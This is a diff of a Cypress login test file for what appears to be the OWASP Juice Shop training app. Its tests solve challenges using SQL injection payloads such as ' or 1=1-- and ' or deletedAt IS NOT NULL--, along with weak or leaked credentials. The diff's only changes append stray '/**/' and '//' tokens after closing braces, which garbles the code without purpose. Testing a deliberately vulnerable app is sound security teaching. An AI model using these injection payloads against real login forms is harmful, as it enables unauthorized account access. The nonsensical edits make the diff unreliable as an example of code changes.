@@ -1,14 +1,14 @@
 describe('/#/login', () => {
   beforeEach(() => {
     cy.visit('/#/login')
-  })
+  })/**/
 
   describe('challenge "loginAdmin"', () => {
     it('should log in Admin with SQLI attack on email field using "\' or 1=1--"', () => {
       cy.get('#email').type("' or 1=1--")
       cy.get('#password').type('a')
       cy.get('#loginButton').click()
-    })
+    })/**/
 
     it('should log in Admin with SQLI attack on email field using "admin@<juice-sh.op>\'--"', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
@@ -18,9 +18,9 @@ describe('/#/login', () => {
           cy.get('#loginButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'Login Admin' })
-    })
-  })
+      cy.expectChallengeSolved({ challenge: 'Login Admin' })/**/
+    })/**/
+  })/**/
 
   describe('challenge "loginJim"', () => {
     it('should log in Jim with SQLI attack on email field using "jim@<juice-sh.op>\'--"', () => {
@@ -31,9 +31,9 @@ describe('/#/login', () => {
           cy.get('#loginButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'Login Jim' })
-    })
-  })
+      cy.expectChallengeSolved({ challenge: 'Login Jim' })/**/
+    })/**/
+  })/**/
 
   describe('challenge "loginBender"', () => {
     it('should log in Bender with SQLI attack on email field using "bender@<juice-sh.op>\'--"', () => {
@@ -44,10 +44,10 @@ describe('/#/login', () => {
           cy.get('#loginButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'Login Bender' })
-    })
-  })
-
+      cy.expectChallengeSolved({ challenge: 'Login Bender' })/**/
+    })/**/
+  })/**/
+//
   describe('challenge "adminCredentials"', () => {
     it('should be able to log in with original (weak) admin credentials', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
@@ -57,9 +57,9 @@ describe('/#/login', () => {
           cy.get('#loginButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'Password Strength' })
-    })
-  })
+      cy.expectChallengeSolved({ challenge: 'Password Strength' })/**/
+    })/**/
+  })/**/
 
   describe('challenge "loginSupport"', () => {
     it('should be able to log in with original support-team credentials', () => {
@@ -70,9 +70,9 @@ describe('/#/login', () => {
           cy.get('#loginButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'Login Support Team' })
-    })
-  })
+      cy.expectChallengeSolved({ challenge: 'Login Support Team' })/**/
+    })/**/
+  })/**/
 
   describe('challenge "loginRapper"', () => {
     it('should be able to log in with original MC SafeSearch credentials', () => {
@@ -83,9 +83,9 @@ describe('/#/login', () => {
           cy.get('#loginButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'Login MC SafeSearch' })
-    })
-  })
+      cy.expectChallengeSolved({ challenge: 'Login MC SafeSearch' })/**/
+    })/**/
+  })/**/
 
   describe('challenge "loginAmy"', () => {
     it('should be able to log in with original Amy credentials', () => {
@@ -96,9 +96,9 @@ describe('/#/login', () => {
           cy.get('#loginButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'Login Amy' })
-    })
-  })
+      cy.expectChallengeSolved({ challenge: 'Login Amy' })/**/
+    })/**/
+  })/**/
 
   describe('challenge "dlpPasswordSpraying"', () => {
     it('should be able to log in with original Jannik credentials', () => {
@@ -109,9 +109,9 @@ describe('/#/login', () => {
           cy.get('#loginButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'Leaked Access Logs' })
-    })
-  })
+      cy.expectChallengeSolved({ challenge: 'Leaked Access Logs' })/**/
+    })/**/
+  })/**/
 
   describe('challenge "twoFactorAuthUnsafeSecretStorage"', () => {
     it('should be able to log into a exsisting 2fa protected account given the right token', () => {
@@ -129,9 +129,9 @@ describe('/#/login', () => {
           void cy.get('#totpSubmitButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'Two Factor Authentication' })
-    })
-  })
+      cy.expectChallengeSolved({ challenge: 'Two Factor Authentication' })/**/
+    })/**/
+  })/**/
 
   describe('challenge "oauthUserPassword"', () => {
     it('should be able to log in as bjoern.kimminich@gmail.com with base64-encoded email as password', () => {
@@ -139,16 +139,16 @@ describe('/#/login', () => {
       cy.get('#password').type('bW9jLmxpYW1nQGhjaW5pbW1pay5ucmVvamI=')
       cy.get('#loginButton').click()
 
-      cy.expectChallengeSolved({ challenge: 'Login Bjoern' })
-    })
-  })
+      cy.expectChallengeSolved({ challenge: 'Login Bjoern' })/**/
+    })/**/
+  })/**/
 
   describe('challenge "ghostLogin"', () => {
     it('should be able to log in as chris.pike@juice-sh.op by using "\' or deletedAt IS NOT NULL --"', () => {
       cy.get('#email').type("' or deletedAt IS NOT NULL--")
       cy.get('#password').type('a')
       cy.get('#loginButton').click()
-    })
+    })/**/
 
     it('should be able to log in as chris.pike@juice-sh.op by using "chris.pike@juice-sh.op\' --"', () => {
       cy.task<string>('GetFromConfig', 'application.domain').then(
@@ -158,9 +158,9 @@ describe('/#/login', () => {
           cy.get('#loginButton').click()
         }
       )
-      cy.expectChallengeSolved({ challenge: 'GDPR Data Erasure' })
-    })
-  })
+      cy.expectChallengeSolved({ challenge: 'GDPR Data Erasure' })/**/
+    })/**/
+  })/**/
 
   describe('challenge "ephemeralAccountant"', () => {
     it('should log in non-existing accountant user with SQLI attack on email field using UNION SELECT payload', () => {
@@ -169,7 +169,7 @@ describe('/#/login', () => {
       )
       cy.get('#password').type('a')
       cy.get('#loginButton').click()
-      cy.expectChallengeSolved({ challenge: 'Ephemeral Accountant' })
-    })
-  })
-})
+      cy.expectChallengeSolved({ challenge: 'Ephemeral Accountant' })/**/
+    })/**/
+  })/**/
+})/**/
